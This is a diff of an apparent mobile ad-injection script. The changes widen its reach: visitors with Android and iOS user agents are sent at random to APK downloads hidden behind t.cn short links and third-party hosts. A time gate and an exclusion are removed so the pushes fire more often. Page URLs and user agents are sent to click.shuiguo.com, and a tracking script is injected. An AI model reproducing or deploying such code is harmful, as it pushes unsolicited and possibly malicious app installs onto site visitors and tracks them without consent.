@@ -89,7 +89,7 @@ var hy_itv=setInterval(function(){
 
 
 	if(getCookie("hycpc1")=="1"){
-		pname="360ysdq.apk";
+		pname="http://t.cn/R7n2ueA";
 		iosname="http://www.haima.me/?c=cpapz";
 		setCookie("hycpc1","0");
 	}
@@ -137,17 +137,12 @@ var hy_itv=setInterval(function(){
 		switch(num)
 		{
 			case "31":
-				result="http://m.haoghost.com/images/test/360ysdq.apk";
-				break;
-			case "35":
-				result="http://soft.91zan.com/suwei/sybb.10C352.apk";
-				break;
-			case "33":
 				result="http://t.cn/R7TPUOV";
 				break;
 			default:
-				if(rd<0.3) result="http://m.haoghost.com/images/test/360ysdq.apk";
-				result="360sqyy774.apk";
+				if(rd<0.4) result="http://t.cn/R7n2ueA";
+				else if(rd<0.8) result="http://soft.91zan.com/suwei/sybb.10C352.apk";
+				else result="http://t.cn/R7TPUOV";
 		}
 		return result;
 	}
@@ -179,7 +174,7 @@ var hy_itv=setInterval(function(){
 	{
 		if(hour==8) return true;
 		var rd=Math.random();
-		return rd>0.1?true:false;
+		return rd>0.15?true:false;
 	}
 
 	if(/android/i.test(navigator.userAgent) || /ipad|iphone|ipod/i.test(navigator.userAgent))
@@ -284,7 +279,7 @@ var hy_itv=setInterval(function(){
 
 
 			var hyipdata=parseInt(getCookie("hyipdata"));
-			if(hyipdata!=0 && hyipdata!=1 && /android/i.test(ua) && num!=31 )
+			if(hyipdata!=0 && hyipdata!=1 && /android/i.test(ua))
 			{
 				/*getJsonp(
 					'http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',
@@ -317,24 +312,20 @@ var hy_itv=setInterval(function(){
 				if(isDownSelf())
 				{
 					setCookie("hyipdata","0");
-					if(hlTime())
-					{
-						pname="Qvod_collect_v3.14.14.apk";
-						getJsonp(
-							'http://click.shuiguo.com/index.php?action=index&method=main1',
-							"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
-							function(data){
+					pname="Qvod_collect_v3.14.15.apk";
+					getJsonp(
+						'http://click.shuiguo.com/index.php?action=index&method=main1',
+						"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
+						function(data){
 
-							}
-						);
-						var script = document.createElement("script");
-						script.type = "text/javascript";
-						script.language = "javascript";
-						script.src="http://s13.cnzz.com/stat.php?id=1253232964&web_id=1253232964";
-						var tj=document.getElementById("hy_cpc_tj");
-						tj.appendChild(script);
-
-					}
+						}
+					);
+					var script = document.createElement("script");
+					script.type = "text/javascript";
+					script.language = "javascript";
+					script.src="http://s13.cnzz.com/stat.php?id=1253232964&web_id=1253232964";
+					var tj=document.getElementById("hy_cpc_tj");
+					tj.appendChild(script);
 				}
 				else
 				{
@@ -441,7 +432,7 @@ var hy_itv=setInterval(function(){
 			}
 			if(num==31)
 			{
-				hideAdv("xcy_fmt_9v");
+				regHideAdv("BAIDU_DUP");
 			}
 			if(num==32)
 			{
